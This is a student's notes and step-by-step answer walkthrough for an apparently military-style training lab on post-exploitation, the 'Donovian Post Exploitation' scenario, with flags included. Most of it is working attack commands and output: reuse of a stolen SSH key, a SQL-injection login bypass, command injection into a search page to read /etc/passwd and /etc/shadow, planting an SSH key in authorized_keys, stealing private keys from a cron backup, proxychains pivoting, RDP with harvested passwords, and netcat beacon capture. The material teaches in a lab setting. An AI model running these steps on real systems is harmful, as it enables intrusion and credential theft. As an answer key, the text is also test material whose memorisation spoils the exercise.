## Notes ##

chmod 600 /home/student/stolenkey
ssh -i /home/student/stolenkey jane@1.2.3.4

### Using Stolen Identity Key ###

Once identity key has been taken from a target it must be prepped before use on you box

#### On your attack box #####

1. Set permissions to user only read and write

`chmod 600 /home/user/stolenkey`

2. Use -i option when SSHing to new target

`ssh -i /home/user/stolenkey jane@10.20.30.40`

-i lets you select a specific identity key to use. By default it will look in you own .ssh/ folder for a key to use

#### Windows User Enumeration Commands #### 

net user                           - Displays a list of local users by username

net user <username>                - Displays properties associated with that username

net localgroup                     - Displays a list of local groups on the system

net localgroup <groupName>         - Provides a description of what the local group can do with a list of members in that group

wmic useraccount get name,sid      - This command displays the Security IDs (SIDs) of all user accounts on the system. If you know the username, use this command: wmic useraccount where name="USER" get sid

#### Linux User Enumeration Commands ####

cat /etc/passwd *OR* getent passwd - List of all users/accounts on the local system by name, user-id, comment, home directory, and shell.

cat /etc/shadow                    - List of all users/accounts on the system along with their hashed passwd, password age, and  expiration information.

last 	                             - History of previous account login/logout by username, terminal (local, remote), system/IP, date/time of login/logout, and duration.

who 	                             - Who is currently logged into the system by name, terminal (local/remote), date/time they logged in, and IP address if remote.

w 	                               - Who is currently logged into the system by username, terminal, and what they are doing.

whoami 	                           - Displays the user name of the user running the command

groups 	                           - Displays the list of groups to which the user running the command is a member

id 	                               - Displays the username, userid, group name(s), and groupid(s) of the user running the command

Linux typically includes at least two of the preceding commands that can alter the data in a way that can be reversed. All convert files to a text equivalent, some are a little more challenging to work with, but you use what you have. The easiest one to work with is base64.

`cat /etc/passwd | base64 > base64ed.txt`

The following will decode the text

`cat base64ed.txt | base64 -d`

step 1. ssh to the linops `ssh -X student@10.50.24.96`

step 2. `sudo su`

step 3. `watch tail /var/log/auth.log`

step 4. `ssh -M -S /tmp/linops -X student@10.50.24.96`

step 5. `ssh -o 'ControlPath=/tmp/linops' -X student@10.50.24.96:/etc/passwd .`

##### User Enumeration #####

Windows `net user`
Linux `cat /etc/passwd`

##### Process Enumeration #####

Windows `tasklist /v`
Linux `ps -elfH`

##### Service Enumeration #####

Windows `tasklist /svc`
Linux
    `chkconfig`                   SysV
    `systemctl --type=service`    SystemD

`cat /etc/*rel*` The command "cat /etc/rel" is a Unix/Linux command that attempts to display the contents of any files in the "/etc" directory whose filenames contain the string "rel" (case-insensitive). It uses the wildcard "*" to match any files that have "rel" in their names.

`cat /etc/hosts` checks if local hosts have been manipulated such as if 127.0.0.1 has been manipulated. 

`cat /etc/resolv.conf` # The command "cat /etc/resolv.conf" is a Unix/Linux command that is used to display the contents of the "/etc/resolv.conf" file in your system. This file contains information about the DNS (Domain Name System) configuration on your computer, which is used to translate human-readable domain names (like www.example.com) into IP addresses that computers can use to locate servers on the internet.

`lsof` show the list of open files. It is a powerful and versatile command-line tool used to display information about files that are currently open or in use by processes on your system.

`ls -lisa /tmp/linops` The command ls -lisa /tmp/linops is used to list detailed information about a specific directory or file. Let's break down this command: srw-------: This is the file's permissions and type information. In this case, it's indicating that the file is a "socket" (s) and has read (r) and write (w) permissions for the owner, but no permissions for group or others (-------).

##### Directories you could be looking at #####

/etc/crontab

`find / -iname hacker* 2> /dev/null` how to find something 

`;find / -iname network* 2> /dev/null` how to find something 


## CHALLENGES ##

Donovian Post Exploitation (DPE)
XX Mar 2024
Start Time: 1300
Duration: 4 hours

Type of Operation: Cyber Intelligence, Surveillance and Reconnaissance (C-ISR)

Objective: Maneuver through Donovian-Extranet, identify and gain access futher into Donovian internal Cyberspace, it is believed that there is an network that acts as an internal DMZ between these to locations. Intelligence was able to identify the last octet of a system that resides in the Donovian internal Cyberspace.

Tools/Techniques: All connections will be established through SSH masquerades or web browser. Ports in use will be dependent on target location and are subject to change. Network scanning tools/technique usage is at the discretion of student. Credential reuse is authorized

Scenario Credentials: FLAG = P05T3xpl01t5t@rtoF@ct1v1ty

Prior Approvals: Sudo usage and remote port forward is authorized. System dir walks from system roots, altering accounts/routing or tool uploads are authorized. Survey and access to newly discovered systems during C-ISR.

Scheme of Maneuver:
>Jump Box
->T1: 192.168.28.100
-->T3:x.x.x.9

Target Section:

T1
Hostname: Donovian_Extranet
IP: 192.168.28.100
OS: CentOS
Creds:Unknown
Last Known SSH Port: 2222
PSP: none
Malware: none
Action: Perform SSH masquerade and survey system. Identify redirection to the next target.

T3
Hostname: unknown
IP: x.x.x.9
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Gain access; survey host and map Donovian internal Cyberspace.

#### Post - Extranet 5 ####

Utilizing the intelligence provided, enumerate the target provided. Look for user generated documents, relating to network structure, on this host that will direct further actions.

##### ANSWER #####

Step 1. ssh into the jumpbox -> `ssh comrade@localhost -p 11111 -D 9050 `

step 2. find the http ports and folders open -> `proxychains nmap -sV --script=http-enum 192.168.28.100`
    Gives: 

    Nmap scan report for 192.168.28.100
    Host is up (0.00042s latency).
    Not shown: 998 closed ports
    PORT     STATE SERVICE VERSION
    80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
    | http-enum: 
    |   /admin/: Possible admin folder
    |   /admin/login.php: Possible admin folder
    |_  /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

step 3. On linops, make sure the proxy setting for firefox are enabled and then open: http://192.168.28.100/admin/login.php

step 4: SQl login to the page by using sql injection on the user and password field -> `tom' or 1='1`

step 5: Brings you to the find page. Question is asking for network. find anything associated with network since the page is vulnerable to sql injection

`;find / -iname network* 2> /dev/null ` find the network page. 

Step 6: YOu find that there's an interesting path -> `ls /home/comrade/Dekstop/network`

Step 7: findout whats on the directory in step 6. `;ls /home/comrade/Dekstop/network`
        map.png is on the directory 

step 8: Find out if there are any hidden directories `;ls -a /home/comrade/Dekstop/network`

Step 9. There is a mapkey.txt file Cat this file to see whats inside `;cat /home/comrade/Dekstop/network/.mapkey.txt`
        What's inside the contents is the answer for this question -> 2ljeSS3CbYtDob90cbeH


#### Post - Extranet 2 5 ####

The Donovian government is furthering their inventory expansion project. Identify and locate this intel to support this.

Hint
This flag is base64 encoded

##### ANSWER #####

Step 1. follow from step 5 of Post - Extranet 5 

Step 2. `;find / -iname *inventory* 2> /dev/null` -> Running this on the search directory you'll find 

/usr/share/equip-inventory.txt

Step 3. Cat that to find the flag `;cat /usr/share/equip-inventory.txt`

Step 4. Decode the flag to base 64 `echo RVNYSmtNR08yZUlFa2RkNDVjWGMK | base64 --decode`

Answ -> ESXJkMGO2eIEkdd45cXc

#### Post - Intranet 5 ####

Enumerate all network items, relating to name resolution.

##### ANSWER #####

Step 1. follow from step 5 of Post - Extranet 5 

Step 2. run `cat /etc/hosts` to see which hosts are open 

    Result 
    127.0.0.1 localhost
    # The following lines are desirable for IPv6 capable hosts
    ::1 ip6-localhost ip6-loopback
    fe00::0 ip6-localnet
    ff00::0 ip6-mcastprefix
    ff02::1 ip6-allnodes
    ff02::2 ip6-allrouters
    ff02::3 ip6-allhosts
    192.168.150.253 Donovian-Intranet

Step 3. We need to enumarate 192.168.150.253 and inorder to enumerate this, we need to copy our ssh keys to 192.168.28.100 who has access to 192.168.150.253 Donovian-Intrane

Step 4. run `;cat /etc/passwd` -> will show no-logins and the once that the user has a login to is -> www-data:x:33:33:www-data:/var/www:/bin/bash . This shows the user has the login shell,  www-data:x:33:33:www-data:/var/www:/bin/bash    #/var/www is the home folder for this user and /bin/bash is login shell.

Step 5. We need to insert our ssh keys here so we can login to 192.168.28.100

Step 6.  `;ls -la /var/www`     #check if .ssh exists. On running this we find. So `www-data` exists

    total 20
    drwxrwxr-x  5 root     www-data 4096 Jan 10 17:00 .
    drwxr-xr-x 14 root     root     4096 May  4  2023 ..
    drwxr-xr-x  3 www-data www-data 4096 Jan 10 17:00 .local
    drwx------  2 www-data www-data 4096 Jan 10 16:47 .ssh
    drwxr-xr-x  4 root     root     4096 May  4  2023 html

Step 7. Run the ssh key gen command on ops-station. When prompted for location to save just press enter to leave default, you can press enter for password as well -> run `ssh-keygen -t rsa`

Step 8. After generating ssh key look for public key in your .ssh folder. Your public key will have .pub as the extension run `cat ~/.ssh/id_rsa.pub`

Step 9. Echo ssh key to the authorized_keys file in the users .ssh folder. `;echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDUuzyRZfQxZoXMjFAANpRysa0Lcr7ITtYGd+CSGPIBoxUXokTTon2Pye19TNMQ8dz/ttd7jng3mSSAwkxPtWhWVhjm6vYiwt/rKELaLVFPESyLn6aU5NcYTMDQoSodUBFuUl1KXgxVleWNJPUm2vCXGlrmhEVU1ElGigRIb3MEqSVNEazdDehHv9m9pz/+eLiwWCk7dUpKxUup8fd2QMqzBNzgRO+NMSzeJemv0A5vs1mLTSaR1BZpH+tIPIRzc3T4+8uQf3BAHg1lcz1CFwo0nsTSs/+KouRCae03dbc/+Ck5pUDlsuqyvmkgRyvcZrO43mCHiOkUa7Fdmx+en0CH" >> /var/www/.ssh/authorized_keys`

Step 10. Check that the keys were added `;cat /var/www/.ssh/authorized_keys`

Step 11. If you can see the results of the cat the keys were successfully added. From you linops now login to extranet using `proxychains ssh -p 2222 www-data@192.168.28.100`

Step 12. Enumerate all files related to name resolutions -> `cd /etc`

Step 13. Enumerate all files related to name resolutions -> ` cat crontab`

    # /etc/crontab: system-wide crontab
    # Unlike any other crontab you don't have to run the `crontab'
    # command to install the new version when you edit this file
    # and files in /etc/cron.d. These files also have username fields,
    # that none of the other crontabs do.Enumerate all network items, relating to name resolution.

    SHELL=/bin/sh
    PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

    # m h dom mon dow user	command
    17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
    25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
    47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
    52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
    #
    *  *    * * *   root    tar -C /home/comrade/ -czf /tmp/backup.tar.gz .ssh/


Step 14. untar the file from /tmp/backup.tar.gz .ssh/ using `tar -xvzf backup.tar.gz` frin /tmp folder

    Gives: 
        .ssh/
        .ssh/id_rsa.pub
        .ssh/id_rsa
        www-data@extranet:/tmp$ pwd
        /tmp

Step 15. Move the .ssh file to the /var/www/ directory -> `cp -r .ssh/ /var/www/`

Step 16. Scan open ports to see what ports you can ssh to on `proxychains nmap -p 1-9999 -sV -Pn 192.168.150.253`
    
    |S-chain|-<>-127.0.0.1:9050-<><>-192.168.150.253:80-<><>-OK
    |S-chain|-<>-127.0.0.1:9050-<><>-192.168.150.253:514-<><>-OK
    |S-chain|-<>-127.0.0.1:9050-<><>-192.168.150.253:3201-<><>-OK

Step 17. login to .253 using the ssh path -> `ssh -i /var/www/.ssh/id_rsa -p 3201 comrade@192.168.150.253`

Step 18. cat and see the contents of the hosts directory `cat cd /etc/hosts`

Answ -> #f1@g = CTRWP77dkz93JIKwM9mX

#### Post - Intranet 2 5 ####

Enumerate all items related to syslog and rsyslog.

##### ANSWER #####

Step 1. To view logs, you will need the password. Go to the home directory `cd ~`

Step 2. Get the password `cat password.txt`
        comrade::StudentMidwayPassword

Step 3. Check the syslog -> `cd /etc/rsyslog.d`

Step 4. Check all the .conf files -> `cat *`

Step 5. The flag will be at the bottom -> f1ag = 0WvFwwxy9vnA1VXJNN9e

#### Post - Intranet 3 8 ####

Enumerate user directories on the machine. Find artifacts of malicious intent. You might need higher privileges...

##### ANSWER #####

Step 1. cd as a root user `sudo su`

Step 2. `ls /root` -> check the user 

Step 3. `cd /root/brootkit/brootkit-master/`

Step 4. `cat br.conf`

Answ -> #f1@G = tZ4F6ZZJLpI91lFOG2nH

#### Post - Intranet 4 5 ####

Enumerate for security products that may be installed on the system. (i.e. antivirus, etc.)

Hint
Research the top 10 antivirus programs for Linux.

##### ANSWER #####

Step 1: cd to /etc/ 

Step 2. `cat rkhunter.conf`

#### Post - Intranet 5 5 ####

Enumerate information related the users on this system.

##### ANSWER #####

Step 1. `cat /etc/shadow ` # Where passwords used to kept

Answ -> #F1aG = TVU5jAcl4glGnkZJqDFG

#### Post - Intranet 6 5 ####

Enumerate items that would be related to jobs and tasks that running on the host, you may need to use higher privileges.

##### ANSWER #####

Step 1. /var/spool/cron/crontabs is a directory that contains the crontab files for individual users. Crontab is a scheduling service that allows users to schedule tasks or jobs to run automatically at specified times and intervals. 

Step 2. `cd /var/spool/cron/crontabs`

Step 3. `cat root `

Ans -> '#Fl@g = 8pz3o6YeRIgNM58WgsyG

#### Post - Internal 5 ####

You have been tasked to collect intelligence relating to one of the Donovian General Officers.

The Gorgas Allied intelligence cell have determined that the 3rd and 4th octet of the the Donovian Internal Network is xxx.xxx.28.9


##### ANSWER #####

Step 1. From linops scan for 192.168.28.9 so -> `proxychains nmap -p 1-9999 -sV -Pn 192.168.28.9`

Step 2. Open ports would be: 

|S-chain|-<>-127.0.0.1:9050-<><>-192.168.28.9:135-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-192.168.28.9:139-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-192.168.28.9:445-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-192.168.28.9:3389-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-192.168.28.9:5040-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-192.168.28.9:5985-<><>-OK

proxychains nmap -p 135,139,445,3389,5040,5985 192.168.28.9


Step 4: Create a local tunnel from extranet to Internal IP

student@lin-ops:~$ `ssh www-data@localhost -p 12121 -L 12333:192.168.28.9:3389` 

Step 5:

Use xrdp to get in the windows box

student@lin-ops:~$ `xfreerdp /v:localhost:12333 /u:comrade /p:StudentMidwayPassword /size:1920x1000 +clipboard` 

Step 6:

From the question Donovian General Officers is being asked. Go to the file exporer and check -> C:\Users\generalstaz\Downloads\ 

The flag is under donovian - battle brief -> BDtoZZwCZVo39kY51sKQ

#### Post - Internal 2 5 ####

The Gorgas Government has informed your team that sensitive technology data may be present within their Internal network. Enumerate directories critical to the OS and locate the data.

##### ANSWER #####

Go to C:\Windows\ on the file explorer and search in the windows tab for gorgas. Open the first file that pops up. 

Ans ->  e81ApwPReAPMB0Cl9SfF

#### Post - Internal 3 5 ####

You have been tasked to validate whether a persistence mechanism has already been set on this host.

##### ANSWER #####

Open regedit - > Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\

Open the folders -> Computer -> HKEY_LOCAL_MACHINE -> SOFTWARE -> Microsoft -> Windows -> CurrentVersion -> Run 

Double click Checkin

Flag fWeAY7jfKohsFG23HDvy

#### Post - Intranet 7 8 ####

Find the beacon being received by the intranet host and determine how to interact with it.

Hint
The message maybe encoded ==

##### ANSWER #####

Step 1 - > on comrade@lin, 

comrade@lin:/etc$ `sudo tcpdump not port 3201` 

Step 2: Open a new window for comrade@lin

student@lin-ops:~$ `proxychains ssh -i /var/www/.ssh/id_rsa -p 3201 comrade@192.168.150.253`

Step 3: from step 1, notice how the ports are incrementing and listen on the port that's incrementing. sudo su on comrade@lin and change permissions for nc to `chmod +x /bin/nc` then run root@lin:/home/comrade# `nc -lvp 12320`

The flag is dumped, VENkeG16dGN1eENBS1h1ZGRWRGUK. echo that to base64

`echo VENkeG16dGN1eENBS1h1ZGRWRGUK | base64 --decode` 

Ans -> TCdxmztcuxCAKXuddVDe